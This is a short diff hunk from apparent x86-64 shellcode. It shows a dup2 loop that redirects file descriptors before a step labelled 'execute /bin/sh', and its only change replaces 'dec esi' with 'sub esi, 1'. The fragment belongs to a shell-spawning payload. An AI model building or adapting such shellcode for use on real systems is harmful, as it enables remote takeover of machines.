@@ -81,7 +81,7 @@ dup_loop64:
     push    33               ; rax=sys_dup2
     pop     rax
     syscall
-    dec     esi
+    sub     esi, 1
     jns     dup_loop64       ; jump if not signed   
     
     ; step 6, execute /bin/sh
